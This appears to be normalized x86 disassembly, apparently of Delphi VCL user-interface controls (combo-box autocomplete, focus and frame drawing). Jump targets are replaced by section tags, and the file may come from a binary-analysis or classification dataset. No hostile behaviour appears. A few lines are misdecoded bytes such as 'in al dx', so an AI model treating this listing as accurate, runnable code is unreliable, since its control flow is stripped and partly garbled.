mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_435e08
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41ce94
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_435e5c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4446f8
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_435e88
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_435f44
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43dec4
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4446f8
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
call sub_40451c
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4446f8
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_43def4
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_4069b4
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4446f8
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435f4b
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
sub_435f50
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_436308
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4436dc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43630f
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_403fe0
lea eax [ ebp - 0x44 ]
call sub_403fbc
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403fe0
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_403fe0
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_43dec4
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_404010
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403fbc
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_435e5c
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_435e88
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40427c
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40bdc8
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_43dec4
mov eax [ ebp - 0x38 ]
call sub_40427c
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403468
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_434e84
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40427c
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_40451c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40427c
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_40451c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43dec4
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_434ea8
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_435e5c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434e84
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40bdc8
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_4041a4
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_4042c8
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_4044dc
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_4041a4
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_4042c8
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_434ea8
dec esi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_4044dc
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_4044dc
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_4042c8
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_43def4
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_4069b4
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43dec4
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_404010
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_436318
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_4041a4
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_4042c8
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_436318
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_436318
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4364cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40427c
test eax eax
jne r-xdata
mov eax esi
call sub_40447c
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_403468
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4364d4
lea eax [ ebp - 0x1c ]
call sub_403fbc
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_403fe0
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_404010
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_40427c
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_4044dc
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_4042c8
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_43def4
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43dec4
mov eax [ ebp - 0x1c ]
call sub_40427c
push eax
mov eax esi
call sub_40427c
pop edx
call sub_4069b4
push eax
push 0x0
push 0x142
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403468
mov eax ebx
mov si 0xffb2
call sub_403468
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_4363c1
add [ edx ] ch
push 0x14f
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_404010
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_40427c
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_4044dc
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_4042c8
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_43def4
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43dec4
mov eax [ ebp - 0x1c ]
call sub_40427c
push eax
mov eax esi
call sub_40427c
pop edx
call sub_4069b4
push eax
push 0x0
push 0x142
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4364d4
lea eax [ ebp - 0x1c ]
call sub_403fbc
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_403fe0
retn
mov eax ebx
mov si 0xffeb
call sub_403468
mov eax ebx
mov si 0xffb2
call sub_403468
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_436500
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_41d6a8
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_41d548
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_41d564
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_41d204
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41ce60
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c694
xor edx edx
mov eax [ esi + 0x208 ]
call sub_41d6a8
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_4365d8
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_436604
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_43f594
mov eax ebx
call sub_43e0ec
test al al
je r-xdata
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_455b0c
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_43e584
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43e0fc
sub_43667c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_435470
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41ce94
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4366d8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_442888
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cfb0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_436901
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43caa0
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41ce60
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d240
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d240
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40326c
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43d864
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_41d628
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41ce60
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d240
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d240
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d628
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
mov eax ebx
call sub_434e84
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d628
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d628
push eax
call DrawFrameControl
jmp r-xdata
sub_436914
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4403f0
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_436938
push ebx
mov ebx eax
mov eax ebx
call sub_44a524
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_436970
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_4369c6
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_4369d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440424
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_436a28
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4451c8
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_436a7c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436aa2
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_44210c
mov eax ebx
mov si 0xffb5
call sub_403468
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_4446f8
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403468
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_436b18
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42f650
mov ebx eax
mov eax ebx
call sub_42f730
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4446f8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42f8c8
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_436b64
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42f650
call sub_42f730
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_442b4c
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_436b90
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441584
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_436bc8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4369d4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_43d680
mov edx 0x19
mov eax esi
call sub_43d6a4
mov dl 0x1
mov eax esi
call sub_44492c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_436c54
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_4449fc
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_4446f8
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_4446f8
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_436ca8
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_4449fc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_455b0c
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_43f0c4
sub_436cdc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_436b90
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_4414b0
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_436d44
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_443b74
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_455a14
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403468
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403468
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_436db1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_436e2a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43dec4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_455a9c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_443b7c
mov eax ebx
mov si 0xffb8
call sub_403468
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403468
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436e31
sub_436e38
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_443b84
pop edi
pop esi
pop ebx
retn
sub_436e8c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42f650
call sub_42f730
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_436eb8
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42f650
mov ebx eax
mov eax ebx
call sub_42f730
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4446f8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42f8c8
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_436f04
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4369d4
mov edx 0x71
mov eax esi
call sub_43d680
mov edx 0x11
mov eax esi
call sub_43d6a4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_436f6c
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403468
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_436fac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
